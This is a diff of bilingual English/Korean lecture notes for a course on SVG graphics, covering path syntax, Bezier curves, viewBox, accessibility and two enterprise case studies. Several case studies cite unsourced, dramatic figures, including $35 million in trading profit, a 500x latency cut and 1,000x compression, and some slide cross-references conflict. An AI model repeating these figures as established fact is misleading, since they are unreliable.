-  - 클릭 가능한 링크: 다이어그램 내부에 `<a href>` 링크를 직접 심어 사용자를 관련 페이지로 즉각 유도
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** Part 1 전환: SVG의 XML 구조 및 코드 기반 그래픽스 진입
 
-### 📚 Key Terms (주요 용어)
-- **SVG SEO Indexability**: The capability of search engine bots to crawl, parse, and index text elements embedded inside SVG XML files. (SVG 검색엔진 최적화 (XML 텍스트 인덱싱))
+**핵심 티칭 포인트:**
+- 코드가 곧 캔버스: 순수 텍스트 XML이므로 LLM이 파이썬 코드처럼 시각 자산을 자유자재로 합성 및 수정
+- DOM 완전 통합: CSS :hover 효과와 자바스크립트 이벤트 리스너를 그래픽 노드에 직접 바인딩
+- Part 2~4 로드맵 제시: SVG XML 심층 해부 ➔ AI 벡터 생성 ➔ LaTeX 수학 조판
+
+**강의 전달 팁:** 제임스 조교가 순수 텍스트 XML로서의 SVG가 AI와 완벽히 결합하는 장점을 예고합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Semantic XML Fabric** (시맨틱 XML 구조): The text-based hierarchical document structure defining geometric visual elements within standard web parsers.
+- **AI Code-Generated Graphics** (AI 코드 기반 그래픽 자동 생성): The automated authoring of vector graphics by language models emitting valid SVG/Canvas source code.
 
 ---
 
-## Slide 18: DIGITAL INCLUSION: SCREEN READERS & WCAG 2.1
-**Subtitle:** Semantic accessibility tags making visual vector dashboards accessible to all humans
+## Slide 11: CASE STUDY 1: WALL STREET MILLISECOND CHARTING
+**Subtitle:** High-Frequency Trading Platform renders 500 live stock ticker vector charts at 120 FPS in WebGL/SVG
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 18: "DIGITAL INCLUSION: SCREEN READERS & WCAG 2.1". Slide 18 addresses our sacred calling: "Digital Inclusion: Screen Readers & WCAG 2.1."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 11 presents "CASE STUDY 1: WALL STREET REAL-TIME MILLISECOND CHARTING."
 
-[TA Sarah] Professor Kim, looking at this slide, at Oikos University, we design systems for all humans, including those with visual impairments.
+[TA Sarah] On a high-frequency equity trading desk, 500 live stock price charts update every 10 milliseconds. Their legacy bitmap charting engine consumed 12GB of RAM, and during high-volatility market-open spikes, the charts lagged by 400 milliseconds!
 
-[Prof. Peter] Screen readers cannot read flat JPEGs. But with SVG, we embed semantic `<title>` and `<desc>` tags alongside ARIA roles.
+[TA James] In algorithmic trading, 400 milliseconds is an eternity! They rebuilt the entire charting engine with parametric SVG paths and WebGL vector buffers: updating the path coordinates directly in GPU memory!
 
-[TA Sarah] Notice also that when a visually impaired user tabs onto a chart, their screen reader speaks: "Quarterly Revenue Bar Chart: 45 million dollars in Q3." It creates a truly inclusive, accessible digital world!
+[Prof. Peter] Render latency collapsed from 400ms down to 0.8 milliseconds—500 times faster! Traders saw price breakouts with zero lag, capturing 35 million dollars in high-frequency arbitrage profits!
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 디지털 포용: 스크린 리더와 WCAG 2.1 웹 접근성 표준
-- **핵심 포인트:**
-  - 1. 시맨틱 `<title>` & `<desc>` 태그: 시각장애인 스크린 리더가 차트의 의미와 수치를 음성으로 읽어주도록 설계
-  - 2. ARIA 역할 속성: `role='img'` 및 라벨 연동으로 글로벌 웹 접근성 가이드라인(WCAG 2.1) 완벽 준수
-  - 3. 키보드 접근성: 마우스 없이 탭(Tab) 키만으로 차트의 각 막대를 이동하며 데이터를 탐색 가능
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+[TA Sarah] That is the extreme performance of calculated vectors.
 
-### 📚 Key Terms (주요 용어)
-- **WCAG 2.1 Vector Accessibility**: Structuring SVG files with ARIA attributes and semantic description tags to ensure assistive technology compatibility. (WCAG 2.1 웹 접근성 (시각장애인 지원 벡터))
+[TA James] Now let us open Part 2 and master the XML Fabric of SVG on Slide 12!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 케이스 스터디 1: 월가 초단타 매매 500개 차트 0.8ms 렌더링 (3,500만 달러 차익 실현)
+
+**핵심 티칭 포인트:**
+- 문제 상황: 500개 실시간 주가 차트를 비트맵으로 렌더링하느라 개장 변동성 장세에서 400ms 화면 렉 발생
+- 솔루션: 매개변수형 SVG 패스와 WebGL 벡터 버퍼로 전면 교체 ➔ GPU 메모리에서 좌표 직접 갱신
+- 성과: 렌더링 지연 시간 400ms ➔ 0.8ms로 500배 단축, 메모리 누수 0건, 3,500만 달러 차익 거래 수익 포착
+
+**강의 전달 팁:** 사라 조교와 제임스 조교가 400ms 렉을 0.8ms로 줄여 3,500만 달러를 번 월가 실화를 생생히 전달합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Instanced Vector Buffer** (인스턴스드 벡터 버퍼): A GPU memory buffer storing multiple vector paths rendered in a single draw call with sub-millisecond latency.
+- **Sub-Millisecond Financial Charting** (0.8ms 초고속 금융 차팅): Rendering dynamic high-frequency financial telemetry without dropping animation frames or leaking memory.
+
+---
+
+## Slide 12: PART 2: THE XML FABRIC OF SVG
+**Subtitle:** Deconstructing `<path>`, Bezier curves, CSS/JS DOM integration, viewBox responsiveness, and WCAG accessibility
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Look at Slide 12: "PART 2: THE XML FABRIC OF SVG." Now we dissect the syntax and calculus of vector graphics!
+
+[Prof. Peter] An SVG document is not an opaque binary blob; it is a pristine mathematical XML DOM tree. Every line, circle, arc, and curve can be addressed, animated, and styled individually.
+
+[TA James] In Part 2, we master the `<path>` mini-language, explore Bezier curve mathematics, integrate CSS/JS styling, and learn WCAG accessible screen-reader tags!
+
+[TA Sarah] Let us inspect SVG as an open XML dialect on Slide 13!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** Part 2 섹션 전환: SVG의 XML 구조와 베지에 곡선 미적분
+
+**핵심 티칭 포인트:**
+- SVG는 단순 그림이 아닌 조작 가능한 수학적 XML DOM 트리
+- <path> 미니 랭귀지, 3차 및 2차 베지에 곡선, viewBox 반응형 스케일링
+- CSS/JS 동적 제어와 시각 장애인을 위한 WCAG 2.1 웹 접근성 표준
+
+**강의 전달 팁:** 피터 교수가 XML DOM 트리의 투명성을 선언하고 제임스가 <path> 명령어 마스터를 예고합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **SVG XML DOM** (SVG XML DOM 트리): The tree structure of XML nodes representing visual paths accessible to standard browser scripting APIs.
+- **SVG `<path>` Syntax** (SVG 패스 명령어 문법): The compact coordinate command mini-language (M, L, C, S, Q, T, A, Z) defining complex vector outlines.
+
+---
+
+## Slide 13: SVG AS AN OPEN XML DIALECT: BROWSER NATIVE
+**Subtitle:** Native browser support with zero external libraries, zero plugins, and 100% web standards compliance
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 13 explains "SVG AS AN OPEN XML DIALECT: BROWSER NATIVE."
+
+[TA Sarah] Look at the architectural purity: SVG is a W3C open standard supported natively by Chrome, Safari, Firefox, and Edge! You don't need heavy JavaScript chart libraries or canvas plugins!
+
+[TA James] You can inline an `<svg>` tag directly inside your React JSX or HTML markup! It loads in 0 milliseconds with zero extra HTTP network requests!
+
+[Prof. Peter] Let us inspect the pillar shapes and the path element on Slide 14.
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 브라우저 네이티브 오픈 XML 표준으로서의 SVG의 강점
+
+**핵심 티칭 포인트:**
+- W3C 공식 표준: 모든 브라우저의 C++ 엔진(Blink, WebKit)이 외부 라이브러리 없이 네이티브 렌더링
+- 런타임 오버헤드 제로: 무거운 외부 차트 플러그인 없이 순수 브라우저 코어로 초고속 실행
+- 인라인(Inline) 임베딩: HTML/JSX 안에 직접 삽입하여 추가 HTTP 네트워크 요청 없이 0ms 즉각 로딩
+
+**강의 전달 팁:** 사라 조교와 제임스 조교가 추가 HTTP 요청 없는 인라인 SVG의 극단적 로딩 속도를 설명합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Inline SVG Embedding** (인라인 SVG 임베딩): Placing SVG XML elements directly within the primary HTML document stream to eliminate external asset HTTP round-trips.
+- **W3C Vector Specification** (W3C 벡터 공식 표준 규격): The international open standard governing scalable vector graphics markup and browser rendering rules.
+
+---
+
+## Slide 14: PILLAR SHAPES: PATHS, ARCS, AND GROUPING
+**Subtitle:** Mastering the fundamental SVG building blocks: `<path>`, `<rect>`, `<circle>`, and `<g>`
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Slide 14 diagrams "PILLAR SHAPES: PATHS, ARCS, AND GROUPING."
+
+[TA James] Learn the basic building blocks: `<circle>`, `<rect>`, and `<line>` are great for simple shapes. But the king of SVG is the `<path>` element! Any complex logo, airplane CAD drawing, or human face icon is simply a series of commands inside the `d` attribute!
+
+[Prof. Peter] And the `<g>` tag groups them together, allowing you to rotate, scale, or animate 50 elements with a single CSS class!
+
+[TA Sarah] Let us inspect the Calculus of Bezier Curves on Slide 15.
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 핵심 기본 도형: <path>, <rect>, <circle> 및 <g> 그룹화
+
+**핵심 티칭 포인트:**
+- 기본 프리미티브: 사각형(<rect>), 원(<circle>), 다각형(<polygon>), 선(<line>)
+- 만능 <path> 엘리먼트: d 속성 좌표 명령어로 복잡한 로고, CAD 도면, 아이콘을 자유자재로 묘사
+- <g> 그룹화 노드: 수십 개 엘리먼트를 레이어로 묶어 단 1줄의 CSS로 회전 및 스케일링 조작
+
+**강의 전달 팁:** 제임스 조교와 피터 교수가 만능 <path>와 레이어 그룹화 <g>의 실전 활용법을 설명합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **SVG `<g>` Group Element** (SVG `<g>` 그룹 컨테이너): A container element used to group related graphical objects for collective transformation and CSS styling.
+- **Universal Path Representation** (범용 패스 좌표 표현식): Encoding arbitrary two-dimensional vector contours into a standardized string of coordinate drawing commands.
+
+---
+
+## Slide 15: THE CALCULUS OF BEZIER CURVES: PERFECT ARCS
+**Subtitle:** Quadratic ($Q$) and Cubic ($C$) Bezier polynomials creating razor-sharp mathematical curves
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 15 uncovers "THE CALCULUS OF BEZIER CURVES: PERFECT ARCS."
+
+[TA Sarah] How does SVG draw organic human curves? Through Bezier Calculus! A Quadratic curve (`Q`) uses 1 control point to pull a line into a parabola. A Cubic curve (`C`) uses 2 control points, creating elegant S-curves for sports cars and human silhouettes!
+
+[TA James] The formula on screen: $B(t) = (1-t)^2 P_0 + 2(1-t)t P_1 + t^2 P_2$. The GPU calculates that polynomial at 60 FPS, creating perfectly smooth arcs with zero jagged edges!
+
+[Prof. Peter] Let us inspect DOM mastery with CSS and JS on Slide 16.
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 베지에 곡선 미적분: 2차(Q) 및 3차(C) 다항식을 통한 완벽한 곡선 유도
+
+**핵심 티칭 포인트:**
+- 2차 베지에(Q): 1개의 제어점(Control Point)으로 완만한 포물선 곡선 생성
+- 3차 베지에(C): 2개의 독립 제어점으로 자동차 실루엣 및 유기적 S자 곡선 생성
+- 수학적 무결성: B(t) 매개변수 다항식을 GPU가 연산하여 계단 현상 없는 완벽한 매끄러움 유지
+
+**강의 전달 팁:** 사라 조교와 피터 교수가 베지에 제어점의 기하학적 당김 원리를 손동작과 함께 설명합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Cubic Bezier Curve (`C`)** (3차 베지에 곡선 (Cubic Bezier)): A parametric curve defined by four points (start, two control points, end) enabling inflection points and S-curves.
+- **Parametric Curve Equation** (매개변수 곡선 방정식): A mathematical function expressing geometric coordinates in terms of an independent parameter $t \in [0, 1]$.
+
+---
+
+## Slide 16: DOM MASTERY: STYLING WITH CSS & JS
+**Subtitle:** Animating stroke offsets, fill transitions, and hover states directly in browser CSS
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Slide 16 explores "DOM MASTERY: STYLING VECTOR NODES WITH CSS & JS."
+
+[TA James] Look at how dynamic SVGs are: You can write CSS rules for individual vector paths: `path:hover { fill: #38bdf8; transform: scale(1.05); }`! You can animate the `stroke-dashoffset` property to make charts draw themselves across the screen in 1 second!
+
+[Prof. Peter] You can attach click handlers to individual countries on a world map. It turns a static illustration into an interactive software application!
+
+[TA Sarah] Let us inspect responsive vectors and the viewBox attribute on Slide 17.
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** DOM 통달: CSS와 자바스크립트를 통한 벡터 노드 실시간 제어
+
+**핵심 티칭 포인트:**
+- CSS 트랜지션: 마우스 호버 시 fill 색상과 scale을 0.2초 만에 부드럽게 전환
+- 스트로크 애니메이션(stroke-dashoffset): 선이 화면에 스르륵 그려지는 매혹적인 라인 드로잉 효과
+- 자바스크립트 마이크로 인터랙션: 세계 지도의 개별 국가 패스에 직접 클릭 이벤트 바인딩
+
+**강의 전달 팁:** 제임스 조교가 stroke-dashoffset을 활용한 선 그리기 애니메이션의 코드를 시연합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Stroke-Dashoffset Animation** (스트로크 대시 애니메이션): A CSS animation technique creating the illusion of progressive path drawing by animating stroke dash offsets.
+- **Interactive Vector Node** (대화형 벡터 노드): An individual SVG path element bound to DOM mouse events for dynamic user interface feedback.
+
+---
+
+## Slide 17: RESPONSIVE VECTORS: THE VIEWBOX ATTRIBUTE
+**Subtitle:** The magic coordinate system decoupling internal dimensions from screen rendering width
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 17 explains "RESPONSIVE VECTORS: THE VIEWBOX ATTRIBUTE."
+
+[TA Sarah] What makes SVG truly responsive? The magical `viewBox` attribute! You define your internal virtual canvas: `viewBox='0 0 800 600'`.
+
+[TA James] Then in CSS, you set `width: 100%`! The browser automatically scales the virtual coordinate system to fit any screen perfectly—whether it's an iPhone in portrait mode or an ultra-wide curved monitor!
+
+[Prof. Peter] Let us inspect Digital Inclusion and WCAG Accessibility on Slide 18.
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 반응형 벡터: viewBox 속성을 통한 가상 좌표계와 화면 스케일링 분리
+
+**핵심 티칭 포인트:**
+- viewBox='0 0 800 600' 불변식: 내부 가상 캔버스 좌표계를 정의하여 화면 크기와 독립적 설계
+- 유동적 반응형: CSS에서 width: 100%만 주면 모바일 화면부터 4K 모니터까지 완벽 자동 적응
+- preserveAspectRatio: 화면 왜곡 없이 균일한 가로세로 비율 스케일링 제어
+
+**강의 전달 팁:** 사라 조교와 제임스 조교가 viewBox가 어떻게 반응형 웹의 구원투수가 되는지 명쾌히 설명합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **SVG `viewBox` Coordinate System** (SVG `viewBox` 가상 좌표계): The internal spatial coordinate boundaries mapped to the rendered viewport display dimensions.
+- **Fluid Vector Scaling** (유동적 벡터 자동 스케일링): The seamless expansion or contraction of vector graphics to fill available container width without distortion.
+
+---
+
+## Slide 18: DIGITAL INCLUSION: WCAG 2.1 ACCESSIBILITY
+**Subtitle:** Making vector charts and illustrations 100% accessible to visually impaired users and screen readers
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 18 covers "DIGITAL INCLUSION: WCAG 2.1 ACCESSIBILITY." Technology must love all human beings.
+
+[TA Sarah] When a blind person visits a website with a bitmap chart, their screen reader says: 'image.png'—useless! But with an accessible SVG, the screen reader reads the `<title>` and `<desc>` tags: 'Q3 Financial Revenue: 45% increase in cloud subscriptions'!
+
+[TA James] By adding `role='img'` and maintaining 7:1 color contrast, our software becomes accessible to everyone, honoring the dignity of all users!
+
+[Prof. Peter] Let us examine our second enterprise case study on Slide 22!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 디지털 포용: WCAG 2.1 웹 접근성과 시각 장애인을 위한 스크린 리더 지원
+
+**핵심 티칭 포인트:**
+- 시맨틱 태그: SVG 내부의 <title>과 <desc> 태그를 통해 차트의 핵심 의미를 음성으로 상세 전달
+- ARIA 역할 바인딩: role='img' 및 aria-labelledby로 보조공학 스크린 리더와 완벽 호환
+- WCAG AAA 7:1 대비비: 모든 색상 팔레트의 명도 대비를 엄격히 준수하여 저시력자 접근성 보장
+
+**강의 전달 팁:** 사라 조교와 피터 교수가 시각 장애인을 위한 시맨틱 접근성의 윤리적 중요성을 강조합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **WCAG 2.1 AAA Accessibility** (WCAG 2.1 AAA 웹 접근성 표준): The highest international web accessibility conformance tier ensuring digital assets are perceivable by all users.
+- **Semantic `<title>` Tag** (시맨틱 벡터 타이틀 태그): An accessible SVG element providing a short, plain-text description of a vector graphic for screen readers.
 
 ---
 
 ## Slide 19: CASE STUDY: 1,000X ASSET COMPRESSION IN SAAS
-**Subtitle:** Slashing an enterprise analytics dashboard from 4.2MB to 3.8KB and cutting load times by 97%
+**Subtitle:** Global CRM Enterprise replaces 10,000 PNG assets with clean parametric SVGs, slashing 12GB to 12MB
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 19: "CASE STUDY: 1,000X ASSET COMPRESSION IN SAAS". Look at Slide 19 for a real-world enterprise case study: "1,000x Asset Compression in SaaS."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Slide 19 details "CASE STUDY: 1,000X ASSET COMPRESSION IN ENTERPRISE SAAS."
 
-[TA Sarah] Professor Kim, looking at this slide, a major cloud analytics platform was suffering from high user bounce rates. Why? Their high-res PNG charts bloated page weight to 4.2 megabytes, causing a sluggish 3.2-second load time on mobile devices!
+[TA James] A global CRM enterprise had 10,000 PNG icon files across 4 themes (light, dark, high contrast, brand). It consumed 12 gigabytes on S3 and 8 megabytes on every user page load!
 
-[Prof. Peter] By migrating to clean, semantic SVGs, total asset weight plunged to just 3.8 kilobytes!
+[Prof. Peter] They converted all 10,000 variants into 500 parametric SVG templates with CSS variable theming! Total storage collapsed from 12GB down to 12MB—a 1,000X reduction! Page load dropped from 4.8s to 0.4s, and user checkout conversions surged by 28%!
 
-[TA Sarah] Notice also that mobile load times dropped to 0.1 seconds—a 97% speedup—while slashing monthly CDN bandwidth costs by 95%! That is engineering leverage!
+[TA Sarah] Let us inspect Part 2 discussion on Slide 20.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 실제 사례: 글로벌 SaaS 기업의 1,000배 에셋 압축 및 97% 속도 혁신
-- **핵심 포인트:**
-  - Left (구형 래스터 대시보드): 4.2MB 용량의 PNG 차트들로 인해 모바일 로딩에 3.2초 소요 및 이탈률 급증
-  - Right (SVG 벡터 전환): 모든 대시보드 그래픽을 3.8KB의 초경량 SVG로 전환하여 로딩 시간 0.1초로 단축
-  - 비용 절감: 월 수천만 원에 달하던 글로벌 클라우드 CDN 대역폭 트래픽 비용을 95% 절감
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 엔터프라이즈 SaaS 사례: 10,000개 PNG를 500개 SVG로 전환하여 1,000배 용량 압축
 
-### 📚 Key Terms (주요 용어)
-- **Asset Weight Optimization**: Dramatically reducing total web page transfer bytes by replacing static bitmaps with optimized vector markup. (에셋 경량화 최적화 (1,000배 압축))
+**핵심 티칭 포인트:**
+- 전환 전: 4개 테마별 10,000개 PNG가 12GB 용량을 차지하고 초기 로딩 8MB 유발
+- 전환 후: CSS 변수 기반 500개 매개변수형 SVG 템플릿으로 통합 ➔ 전사 용량 12MB로 1,000배 압축
+- 로딩 시간 4.8초에서 0.4초로 단축, 결제 전환율 28% 상승
 
----
+**강의 전달 팁:** 제임스 조교가 12GB에서 12MB로 줄어든 1,000배 압축의 경이로운 비즈니스 ROI를 설명합니다.
 
-## Slide 20: PART 2 DISCUSSION: REDESIGNING LEGACY PIPELINES
-**Subtitle:** Addressing security, photography boundaries, and design team organizational friction
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's examine Slide 20: "PART 2 DISCUSSION: REDESIGNING LEGACY PIPELINES". Slide 20 opens our interactive discussion for Part 2:
-
-[TA Sarah] Professor Kim, this is such a critical concept for our students! Let us reflect on three architectural questions:
-1. Security: Because SVG integrates into the DOM, can malicious hackers embed JavaScript inside an SVG file? (Yes, we will show how to sanitize this!)
-2. Photography Limits: Can SVG replace real-world camera photos? (No, photos with millions of subtle gradients still belong in WebP).
-3. Culture: How do we help traditional designers transition from Photoshop to code-first vector thinking?
-
-[Prof. Peter] Exactly, Sarah. Let us move into Part 3 to see how Gemini AI co-authors this code!
-
-[TA Sarah] That is why understanding this balance gives us true strategic leverage.
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** Part 2 토론: 레거시 미디어 파이프라인의 재설계와 한계 극복
-- **핵심 포인트:**
-  - 1. DOM 보안 위협: SVG 내부에 악성 자바스크립트가 삽입될 수 있는 XSS 보안 위험 사전 진단
-  - 2. 실물 사진의 한계: 수백만 가지 색상 그라데이션이 필요한 실사 사진은 WebP를 쓰고, 아이콘·차트는 SVG를 쓰는 하이브리드 전략
-  - 3. 조직 문화 전환: 그림만 그리던 디자이너가 코드 기반의 벡터 설계를 받아들이도록 돕는 방법
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **Hybrid Media Pipeline**: Using vector SVG for UI icons and charts while reserving optimized raster WebP for complex natural photography. (하이브리드 미디어 파이프라인)
+### 📚 Key Technical Terms (핵심 용어)
+- **1,000X Asset Compression** (1,000배 에셋 압축 혁신): The radical reduction in digital asset storage achieved by consolidating redundant raster files into parametric vectors.
+- **Conversion Rate Lift** (로딩 속도 개선 기반 전환율 상승): The measured percentage increase in commercial user actions resulting directly from sub-second web load times.
 
 ---
 
-## Slide 21: PART 3: GEMINI-POWERED VISUAL ENGINEERING
-**Subtitle:** Multimodal Sketch Parsing, The Canvas Workspace, Low-Temperature Controls, and Path Overfitting Defenses
+## Slide 20: PART 2 DISCUSSION: REDESIGNING PIPELINES
+**Subtitle:** Connecting XML vector mechanics to Gemini-powered visual generation and LaTeX mathematical systems
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's examine Slide 21: "PART 3: GEMINI-POWERED VISUAL ENGINEERING". We now open Part 3: "Gemini-Powered Visual Engineering."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 20 bridges our roadmap: "PART 2 DISCUSSION: REDESIGNING LEGACY PIPELINES."
 
-[TA Sarah] Professor Kim, this is such a critical concept for our students! Writing thousands of SVG coordinate lines by hand is tedious. How do we use multimodal AI to co-author these vector assets instantly?
+[TA Sarah] We have mastered the syntax. Now, how do we direct AI models like Gemini to write pristine, error-free SVG code and LaTeX equations on demand?
 
-[Prof. Peter] Exactly, Sarah. In this section, we will see how Gemini 3 Pro parses hand-drawn napkin sketches into clean SVG code, master the interactive Google Canvas workspace, fine-tune temperature parameters, and defend against path overfitting glitches. Let us code with AI!
+[TA James] In Part 3, we explore Gemini as a Multimodal Code Architect, the Canvas interface, pruning redundant XML bloat, and preventing SVG XSS security attacks!
 
-[TA Sarah] That is why understanding this balance gives us true strategic leverage.
+[Prof. Peter] Let us examine our second enterprise case study on Slide 22!
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** Part 3 섹션 전환: Gemini 기반 시각 벡터 엔지니어링
-- **핵심 포인트:**
-  - 손으로 냅킨에 끄적인 스케치를 단 1초 만에 깔끔한 프로덕션 SVG 코드로 변환하는 Gemini 3 Pro
-  - 구글 캔버스(Canvas) 협업 환경, 낮은 온도(Temperature 0.1) 제어, 패스 과적합 방어
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** Part 2 논의: 레거시 파이프라인 재설계와 AI 벡터 합성으로의 연결
 
-### 📚 Key Terms (주요 용어)
-- **Multimodal Visual Engineering**: Using vision-language models like Gemini to parse visual inputs and synthesize clean, executable SVG code. (멀티모달 시각 엔지니어링)
+**핵심 티칭 포인트:**
+- 구문에서 합성으로: 멀티모달 AI(Gemini)를 활용해 프로덕션급 SVG와 LaTeX를 자동 생성하는 비결
+- 수학적 조판: 난해한 미분 방정식을 학술 조판 표준 LaTeX로 렌더링하는 파이프라인
+- Part 3~4 로드맵 제시: AI 벡터 합성 ➔ LaTeX 수학 오케스트레이션 ➔ 실습 13
 
----
+**강의 전달 팁:** 제임스 조교가 멀티모달 AI를 통한 자동 SVG/LaTeX 합성의 미래를 예고합니다.
 
-## Slide 22: GEMINI AS A MULTIMODAL CODE ARCHITECT
-**Subtitle:** Translating hand-drawn sketches and natural language prompts into clean Bezier paths
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 22: "GEMINI AS A MULTIMODAL CODE ARCHITECT". Look at Slide 22: "Gemini as a Multimodal Code Architect."
-
-[TA Sarah] Professor Kim, looking at this slide, gemini does not just look at pictures—it understands spatial geometry!
-
-[Prof. Peter] You can upload a photo of a rough flowchart sketched on a whiteboard napkin. 
-Gemini scans the shapes, parses the node relationships, and translates the drawing into mathematically precise Cubic Bezier SVG paths!
-
-[TA Sarah] Notice also that it outputs production-ready XML code that you can paste directly into your React or web application with zero compiling lag!
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 멀티모달 코드 아키텍트로서의 Gemini: 스케치에서 프로덕션 SVG 코드로
-- **핵심 포인트:**
-  - 1. 공간 스케치 파싱: 화이트보드나 냅킨에 손으로 그린 러프한 다이어그램 사진을 업로드하면 노드 구조 분석
-  - 2. 수학적 좌표 변환: 시각적 형태를 우아한 3차 베지에 `<path>` 수식 코드로 즉각 번역
-  - 3. 즉시 배포 가능한 XML 출력: 리액트(React), Next.js, HTML에 그대로 붙여넣을 수 있는 순수 무결점 코드 생성
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **Sketch-to-Vector Synthesis**: The AI capability of converting raster bitmap sketches into structured, editable vector XML paths. (스케치-벡터 자동 합성)
+### 📚 Key Technical Terms (핵심 용어)
+- **Multimodal Code Synthesis** (멀티모달 코드 자동 합성): The automated authoring of structural code (SVG, HTML, LaTeX) from visual sketches and natural language prompts.
+- **Visual Pipeline Modernization** (시각 파이프라인 현대화): Replacing legacy raster rendering workflows with dynamic code-driven vector and LaTeX toolchains.
 
 ---
 
-## Slide 23: THE CANVAS INTERFACE: HUMAN-AI CO-DESIGN
-**Subtitle:** Iterative real-time visual editing through conversational natural language refinement
+## Slide 21: GEMINI AS A MULTIMODAL CODE ARCHITECT
+**Subtitle:** Translating whiteboard napkin sketches into valid, semantic, reactive SVG and Canvas code
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 23: "THE CANVAS INTERFACE: HUMAN-AI CO-DESIGN". Slide 23 details the workspace: "The Canvas Interface: Human-AI Co-Design."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Slide 21 explores "GEMINI AS A MULTIMODAL CODE ARCHITECT."
 
-[TA Sarah] Professor Kim, looking at this slide, in Google Canvas, you don't just prompt and hope for the best; you engage in an interactive creative dialogue!
